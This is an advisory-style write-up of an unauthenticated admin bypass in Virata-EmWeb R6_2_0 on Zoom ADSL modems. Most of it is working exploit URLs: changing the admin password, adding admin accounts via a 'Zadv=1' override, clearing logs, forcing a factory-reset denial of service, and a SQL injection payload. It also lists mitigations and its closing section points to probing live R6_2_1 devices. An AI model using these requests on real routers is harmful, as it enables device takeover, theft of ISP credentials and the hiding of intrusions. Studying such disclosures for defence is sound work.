# Virata-EmWeb R6_2_0 — Authentication Bypass

## Overview

When UPnP services and WAN HTTP administrative access are enabled, authorization and credential challenges can be bypassed by directly accessing root-privileged functionality via a web browser URL. All aspects of the modem/router can be changed, altered, and controlled by an unauthenticated attacker, including gaining access to and modifying PPPoE/PPP ISP credentials.

**No CVE was formally assigned. No patch was ever released.**

---

## Affected Devices

| Device | Firmware | Server Banner |
|---|---|---|
| Zoom X4 ADSL Modem and Router | All GS firmware versions | `UPnP/1.0 Virata-EmWeb/R6_2_0` (Nucleus/4.3) |
| Zoom X5 ADSL Modem and Router | All GS firmware versions | `UPnP/1.0 Virata-EmWeb/R6_2_0` (Nucleus/4.3) |
| Zoom X3 ADSL Modem | All versions (via SOAP API) | `Virata-EmWeb/R6_2_0` |

> **Note:** The Zoom X3 was previously reported with a similar vulnerability via a SOAP API call. Many of the same vulnerabilities affect the X3 without requiring a SOAP API.

---

## Root Causes

These modems contain a privileged tunnel between either side of the router that can be traversed without authentication — a common flaw in IGD UPnP routers and modems. Three specific coding weaknesses compound the issue:

### 1. Hidden Form Fields Exposed + `Zadv=1` Root Override
Form tags and action IDs that are intended to be hidden are easily visible in the HTML source. No sanitization of client-side input occurs. The `Zadv=1` parameter can be appended to any request to invoke root-level privileges by any user without authentication.

### 2. No Cookie Validation After Initial Bypass
No cookie authentication is enforced once the first bypass is executed. This allows requests with `Cookie: sessionId=invalid` to pass arbitrary admin commands.

### 3. SQL Injection
Appending a UNION SELECT payload to any URL that calls a table value will return the system status page with all network interfaces visible and selectable.

```
/MainPage?id=25 UNION SELECT 1,2,3,4,5,6,7--
```

---

## Exploit URLs

No authentication is required for any of the following. All requests can be made directly via a browser or an HTTP GET/POST.

### Access Admin Menus

```
# Full menu/table of contents
http://<IP>/hag/pages/toc.htm

# Advanced options menu
http://<IP>/hag/pages/toolbox.htm
```

### Change Admin Password

```
# Firmware 2.5 and below
http://<IP>/hag/emweb/PopOutUserModify.htm/FormOne&user=admin&ex_param1=admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes

# Firmware 3.0 (uses Zadv=1 override)
http://<IP>/hag/emweb/PopOutUserModify.htm?id=40&user=admin&Zadv=1&ex_param1=admin&new_pass1=123456&new_pass2=123456&id=3&cmdSubmit=Save+Changes
```

### Create New Admin or Intermediate Account

```
# Firmware 2.5 and below
http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&user_id="newintermediateaccount"&priv=v2&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes

# Firmware 3.0 (priv=v1 for full admin)
http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&Zadv=1&ex_param1=admin&user_id="newadminaccount"&priv=v1&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes
```

### Clear Logs

```
http://<IP>/Action?id=76&cmdClear+Log=Clear+Log
```

### Factory Reset (Effective DoS)

> **Warning:** This will almost always result in a long-term denial of service.

```
http://<IP>/Action?reboot_loc=1&id=5&cmdReboot=Reboot
```

---

## Mitigations

Changing the default username and password does **not** mitigate this vulnerability. The following steps should be applied:

1. **Disable UPnP**
   Advanced Options → UPnP → Disable UPnP → Write Settings to Flash → Reboot

2. **Enable Firewall Protections**
   Advanced Options → Firewall Configuration → Enable Attack Protection, DoS Protection, and Black List → Write Settings to Flash

3. **Disable WAN Management**
   Advanced Options → Management Control → Disable WAN Management from all fields → Write Settings to Flash

---

## Vendor Response

The vulnerability was first reported to Zoom Telephonics on **June 28** (year of report). No response was received. Multiple subsequent follow-up emails were sent, all without reply. At the time of disclosure, **no patches or fixes were available**.

---

## Relevance to R6_2_1

The core flaws — the `Zadv=1` override, absence of server-side session validation, and exposed `/hag/` admin endpoints — are properties of the EmWeb server itself, not the device firmware version. Since R6_2_1 is a minor revision of R6_2_0, and no vendor patch was ever issued, these attack paths are expected to carry over verbatim. The `/hag/` endpoint paths are the first surface worth probing on any live R6_2_1 device.

---

## References

- Exploit-DB Entry 26736 — Zoom X4/X5 ADSL Modem/Router `Virata-EmWeb/R6_2_0` Authentication Bypass
- IBM X-Force Exchange — Virata-EmWeb unauthorized DSL modem access
- CVE-2006-0248 — Virata-EmWeb 6_1_0 information disclosure (adjacent version, related class of flaw)